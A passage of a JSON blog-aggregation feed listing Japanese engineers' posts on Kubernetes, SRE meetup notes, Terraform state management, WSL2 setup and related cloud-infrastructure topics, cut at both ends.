その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/3s0T6k24I_o 告知とかニュースっぽいもの Twitterコミュニティ機能についてhttps://twitter.co...","isoDate":"2022-03-04T12:34:50.000Z","dateMiliSeconds":1646397290000,"authorName":"bells17","authorId":"bells17"},{"title":"Twitterを用いたラジオ番組圧縮手法の提案","link":"https://speakerdeck.com/ota1022/twitterwoyong-itaraziofan-zu-ya-suo-shou-fa-noti-an","contentSnippet":"DEIM2022 C21-2(day2 p13)にて発表したスライドです。\\rhttps://event.dbsj.org/deim2022/\\r学生プレゼンテーション賞\\rhttps://event.dbsj.org/deim2022/post/awards.html","isoDate":"2022-02-28T05:00:00.000Z","dateMiliSeconds":1646024400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/02/25] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220225","contentSnippet":"普段は#kubenewsの2022年02月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL: 配信中止して記事だけ放流したので配信URLはありません 告知とかニュースっぽいもの NetApp Insight Japan 2022で講演しましたセッション動...","isoDate":"2022-02-25T13:31:31.000Z","dateMiliSeconds":1645795891000,"authorName":"bells17","authorId":"bells17"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Kubelet APIをcurlで叩く","link":"https://bells17.medium.com/curl-to-kubelet-api-f73cb17888b7?source=rss-713cf42ce34d------2","isoDate":"2022-02-10T16:10:23.000Z","dateMiliSeconds":1644509423000,"authorName":"bells17","authorId":"bells17"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Accurateの内部実装","link":"https://bells17.medium.com/accurate-internal-70915fe716ca?source=rss-713cf42ce34d------2","isoDate":"2021-12-15T18:56:05.000Z","dateMiliSeconds":1639594565000,"authorName":"bells17","authorId":"bells17"},{"title":"GKE CNI Deep Dive (2021)","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interface (cbr0) を介してホストマシン (ノード) とコンテナ間でパケッ...","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"\uD83D\uDD0D 可観測性に入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/ke-guan-ce-xing-niru-men-siyou","contentSnippet":"社内LTにて、可観測性を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（SREに入門しよう）：\\rhttps://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","isoDate":"2021-10-22T04:00:00.000Z","dateMiliSeconds":1634875200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"WSLでGitHubのPersonal access token認証","link":"https://zenn.dev/tayusa/articles/f81e6551642867","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"macOS におけるエンドポイントセキュリティの取り組み","link":"https://speakerdeck.com/kyohmizu/macos-niokeruendopointosekiyuriteifalsequ-rizu-mi","contentSnippet":"Infra Study 2nd #5「低レイヤーの世界への誘い」のLT登壇資料です。\\rhttps://forkwell.connpass.com/event/222932/","isoDate":"2021-09-28T04:00:00.000Z","dateMiliSeconds":1632801600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ストレングスファインダーのコーチングを受けてみた","link":"https://bells17.medium.com/strengthsfinder-2140afddf46f?source=rss-713cf42ce34d------2","isoDate":"2021-08-11T13:27:04.000Z","dateMiliSeconds":1628688424000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83C\uDFD7️ ドメイン駆動設計と依存性逆転の原則","link":"https://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","contentSnippet":"社内LTにて、ドメイン駆動設計と依存性逆転の原則を布教しましたʕ◔ϖ◔ʔ\\r\\rはてなブックマークのコメントもどうぞ！\\r\\rなお、ドメイン駆動設計を理解するためには、依存についても知る必要があります。\\r\\r是非、依存関係と依存オブジェクト注入もご参照ください\uD83D\uDC4D\uD83C\uDFFB","isoDate":"2021-08-06T04:00:00.000Z","dateMiliSeconds":1628222400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kube API Serverの内部実装を解説する技術同人誌を技術書典11で出しました!","link":"https://bells17.medium.com/wrote-the-kube-api-server-book-2155129db374?source=rss-713cf42ce34d------2","isoDate":"2021-07-19T09:16:43.000Z","dateMiliSeconds":1626686203000,"authorName":"bells17","authorId":"bells17"},{"title":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについて","link":"https://zenn.dev/nnaka2992/articles/1fa7fb5d03f958","contentSnippet":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについてTable of ContentsOracleインストール中にでたSysctl系エラーであたったkernel parameterについてMotivationそもそもsysctlとは何なのか？Oracleセットアップ中に遭遇したkernel parameterssemopm変更方法セマフォ(semaphore)とは？SEMSMLSEMMNSSEMOPMSEMMNIfile-max変更方法rem_default/rem_max/...","isoDate":"2021-07-11T08:41:03.000Z","dateMiliSeconds":1625992863000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"\uD83E\uDD1D\uD83C\uDFFB 依存関係と依存オブジェクト注入","link":"https://speakerdeck.com/hiroki_hasegawa/yi-cun-guan-xi-toyi-cun-obuziekutozhu-ru","contentSnippet":"社内LTにて、依存関係と依存オブジェクト注入を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（ドメイン駆動設計と依存性逆転の原則）：\\rhttps://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","isoDate":"2021-06-25T04:00:00.000Z","dateMiliSeconds":1624593600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"\uD83D\uDC2D Goに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/goniru-men-siyou","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-27T04:00:00.000Z","dateMiliSeconds":1622088000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ SREに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","contentSnippet":"社内LTにて、SRE用語を布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-07T04:00:00.000Z","dateMiliSeconds":1620360000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83D\uDC2D Lambda関数をGoで実装してみた話","link":"https://speakerdeck.com/hiroki_hasegawa/lambdaguan-shu-wogodeshi-zhuang-sitemitahua","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-03-26T04:00:00.000Z","dateMiliSeconds":1616731200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"VolumePluginの仕組みと実装解説","link":"https://speakerdeck.com/kyohmizu/volumepluginfalseshi-zu-mitoshi-zhuang-jie-shuo","contentSnippet":"勉強会の資料です。\\rhttps://k8sinternal.connpass.com/event/203946/","isoDate":"2021-02-22T05:00:00.000Z","dateMiliSeconds":1613970000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"July Tech Festa 2021 winterで発表&運営スタッフをしました","link":"https://bells17.medium.com/july-tech-festa-2021-winter%E3%81%A7%E7%99%BA%E8%A1%A8-%E9%81%8B%E5%96%B6%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%92%E3%81%97%E3%81%BE%E3%81%97%E3%81%9F-385e7e18aac4?source=rss-713cf42ce34d------2","isoDate":"2021-01-26T04:26:28.000Z","dateMiliSeconds":1611635188000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","contentSnippet":"目次0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思います。どんな人間がどのくらいの時間をかけて取得したのかを説明するために、少...","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"2020年にKubernetse関連で取り組んだことまとめ","link":"https://bells17.medium.com/2020-kubernetse-4771e660a174?source=rss-713cf42ce34d------2","isoDate":"2020-12-23T16:04:00.000Z","dateMiliSeconds":1608739440000,"authorName":"bells17","authorId":"bells17"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","contentSnippet":"Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。何ができる？GCP 上の VM に対して、アクセス制御を行うことができるGoogle アカウントの ...","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Protocol BuffersやHTTP2などを利用した環境に依存せず...","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作成・マウントしているのか調べました。機能VolumePlugin は...","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削除しようとするとたちまち暗雲が立ち込めます。前提アダプタは記事のタイ...","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりました。ファイルを読み込むシステムによるとは思いますが、後ろのファイルはた...","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kubernetes Internal #1を開催しました","link":"https://bells17.medium.com/kubernetes-internal-1-ea0f1adcfe33?source=rss-713cf42ce34d------2","isoDate":"2020-10-19T10:29:31.000Z","dateMiliSeconds":1603103371000,"authorName":"bells17","authorId":"bells17"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/@yteraoka/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS CDK on Scala ~ Scalaでインフラ管理してみたはなし / Manage infrastructure with AWS CDK on Scala","link":"https://speakerdeck.com/nomadblacky/manage-infrastructure-with-aws-cdk-on-scala","contentSnippet":"https://scala-tokyo.connpass.com/event/187140/","isoDate":"2020-09-25T04:00:00.000Z","dateMiliSeconds":1601006400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"kubeadmの共通処理の実装","link":"https://bells17.medium.com/kubeadm-common-implementation-a5e5b3890dde?source=rss-713cf42ce34d------2","isoDate":"2020-09-12T19:22:01.000Z","dateMiliSeconds":1599938521000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）助かりポイントリソース（Pod/Namespace/C...","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Slinky で Scala.js 製 React Webアプリケーションを つくったはなし / How to build a Scala.js React web application in Slinky","link":"https://speakerdeck.com/nomadblacky/how-to-build-a-scala-dot-js-react-web-application-in-slinky","contentSnippet":"Scala.js 向けの React フレームワークである Slinky でWebアプリケーションを作成したはなし","isoDate":"2020-08-30T04:00:00.000Z","dateMiliSeconds":1598760000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQLに対してprivate ipでアクセスができない$ mysql -u ...","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことを...","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Mac VScode Maven でJunit 使ってみた","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS : Catalina 10.15.5VSCode : 1.46.1...","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Handy Admission Webhook Library","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernetes-sigs/controller-runtimeslok/kubew...","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Mac VSCode JavaでHelloWorldした","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人にはお勧めしません。他にIntelliJ IDEA, Eclipse + P...","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/@yteraoka/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAEにGitHub 